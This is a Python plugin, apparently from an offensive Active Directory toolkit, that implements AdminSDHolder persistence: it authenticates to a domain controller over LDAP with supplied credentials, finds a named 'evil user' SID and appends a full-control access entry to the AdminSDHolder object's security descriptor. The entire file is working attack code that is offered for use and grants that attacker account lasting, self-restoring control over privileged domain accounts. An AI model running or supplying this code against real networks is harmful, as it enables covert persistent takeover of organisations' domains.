import argparse
from copy import copy

import ldap3
from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin
from ldap3 import Server, Connection, NTLM, ALL
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError
from ldap3.protocol.microsoft import security_descriptor_control

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADAdminSDHolder(PluginAdExploitBase):
    display = "AdminSDHolder 权限维持"
    alias = "adm_sdh"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("--username", help="username", required=True, dest="username")
        parser.add_argument("--password", help="password", required=True, dest="password")
        parser.add_argument("--dc-ip", help="domain ip address", required=False, dest="dc_ip")
        parser.add_argument("-e", "--euser", help="evil user", required=True, dest="evil_user")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        domain_fqdn: str = args.domain
        domain_name = ".".join(domain_fqdn.split(".")[-2:])
        username = args.username
        password = args.password
        dc_ip = args.dc_ip
        evil_user = args.evil_user

        _server_ip = dc_ip or domain_fqdn
        connections = self.conn_ldap(username=username, password=password, domain_name=domain_name,
                                     server_ip=_server_ip)
        if connections:
            # 连接成功
            output.success("Credential authentication succeeded!\n")

            # 先查询原始acl，记录
            acl_base_dn = f"CN=AdminSDHolder,CN=System,DC={domain_fqdn.split('.')[-2]},DC={domain_fqdn.split('.')[-1]}"
            acl_filter = "(CN=AdminSDHolder)"
            acl_attribute = ['distinguishedName', 'nTSecurityDescriptor']
            acl_result = self.search(connections, acl_base_dn, acl_filter, acl_attribute)

            acl_str = self.resolve_acl(acl_result["nTSecurityDescriptor"], "")
            output.success(f"{acl_result['distinguishedName']}\n"
                           f"{'':^4}{acl_str}")

            # 查询要插入的用户sid
            base_dn = f"CN=Users,DC={domain_fqdn.split('.')[-2]},DC={domain_fqdn.split('.')[-1]}"
            filter = F"(cn={evil_user})"
            attribute = ['sAMAccountName', 'objectSid']

            evil_user_result = self.search(connections, base_dn, filter, attribute)
            output.success(
                f"get user sid: {evil_user_result['sAMAccountName']}\n{'':^4}{evil_user_result['objectSid']}")

            # 将新用户acl插入条目中
            output.info("inserting user sid...")

            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=acl_result["nTSecurityDescriptor"])
            secDesc['Dacl']['Data'].append(
                self.create_object_full_access_ace(evil_user_result['objectSid']))

            data = secDesc.getData()

            controls = security_descriptor_control(sdflags=0x04)
            connections.modify(acl_base_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
            if connections.result["result"] == 0:
                output.success(f"insert {evil_user_result['objectSid']} to AdminSDHolder success.")

                acl_result = self.search(connections, acl_base_dn, acl_filter, acl_attribute)

                acl_str = self.resolve_acl(acl_result["nTSecurityDescriptor"], evil_user_result['objectSid'])
                output.success(f"{acl_result['distinguishedName']}\n"
                               f"{'':^4}{acl_str}")

        return result

    def conn_ldap(self, username, password, domain_name, server_ip, port=389):
        try:
            self.server = Server(server_ip, port, get_info=ALL)
            conn = Connection(server=self.server,
                              user=f"\\{username}@{domain_name}",
                              password=password,
                              authentication=NTLM, auto_bind=True)

            return conn

        except LDAPBindError as e:
            output.error(e)
            return None
        except LDAPSocketOpenError as e:
            output.error(e)
            return None

    def resolve_acl(self, raw_value, user:str) -> str or None:
        acl_str = set()
        if isinstance(raw_value, bytes):
            sec_desc = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sec_desc.fromString(raw_value)
            for ace in sec_desc["Dacl"].aces:
                acl_str.add(ace['Ace']['Sid'].formatCanonical())
        else:
            output.error("bad acl attribute")
            return None

        result = ""
        for i, a in enumerate(acl_str):
            temp_s = a

            if user != "" and user in temp_s:
                temp_s = f"{output.RED}{a}{output.GREEN}"

            if result == "":
                result = temp_s
            else:
                result = f"{result}\n{'':<4}{temp_s}"

        return result

    def search(self, connections, base_dn, filter, attribute):
        results = connections.extend.standard.paged_search(base_dn, filter, attributes=attribute)

        result = None
        for entry in results:
            if dict(entry).get("attributes"):
                result = dict(entry["attributes"])

        return result

    @staticmethod
    def create_object_full_access_ace(sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = 0x00
        nace['AceFlags'] = 0x00
        nace["AceSize"] = 36
        nace["AceLen"] = 32

        acedata = ldaptypes.ACCESS_ALLOWED_ACE()

        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551

        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        assert sid == acedata['Sid'].formatCanonical()

        nace['Ace'] = acedata
        return nace